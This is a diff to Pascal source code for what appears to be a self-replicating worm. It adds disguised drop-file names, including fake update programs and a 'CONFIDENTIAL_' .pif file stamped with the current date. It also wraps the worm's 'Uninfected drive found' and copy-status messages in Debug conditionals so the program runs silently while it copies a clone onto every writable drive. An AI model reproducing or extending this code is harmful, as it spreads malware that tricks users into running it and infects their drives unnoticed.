@@ -28,13 +28,18 @@ Begin
   Sum:=0;
   For J:=1 to Length(Dir) do Sum += Ord(Dir[J]);
   Result:=IncludeTrailingBackslash(Dir);
-  Sum:=(Sum mod 5);
+  Sum:=(Sum mod 10);
   Case Sum of
     0: Result += 'WinUpdate.exe';
     1: Result += 'New Report.pif';
     2: Result += 'Microsoft Office Upgrade.exe';
     3: Result += 'Launcher.exe';
     4: Result += 'Yesterday.pif';
+    5: Result += 'SoftUpgrade.exe';
+    6: Result += 'Rocet Updater.exe';
+    7: Result += 'CONFIDENTIAL_'+FormatDateTime('dd_mm_yyy', Now)+'.pif';
+    8: Result += '';
+    9: Result += '';
   end;
 end;
 
@@ -103,7 +108,9 @@ Begin
           Lbl:=GetVolumeLabel(I);
           D:=I+':\'+Lbl;
           if Not(DirectoryExists(D)) then Begin
+            {$IFDEF Debug}
             Writeln('Uninfected [',I,'] drive found.');
+            {$ENDIF}
             try
               MkDir(D);
             except
@@ -192,9 +199,13 @@ Begin
   if AlreadyTried.IndexOf(AList.Strings[J])=-1 then Begin
     if WriteAccess(AList.Strings[J]) then Begin
       CopyFile('Clone.tmp', PChar(GetCloneName(AList.Strings[J])), True);
+      {$IFDEF Debug}
       Write('[ OK]: ');
-    end else Write('[BAD]: ');
-    Writeln(AList.Strings[J]));
+      {$ENDIF}
+    end {$IFDEF Debug} else Write('[BAD]: ') {$ENDIF} ;
+    {$IFDEF Debug}
+    Writeln(AList.Strings[J]);
+    {$ENDIF}
     AlreadyTried.Add(AList.Strings[J]);
   end;
   AList.Free;
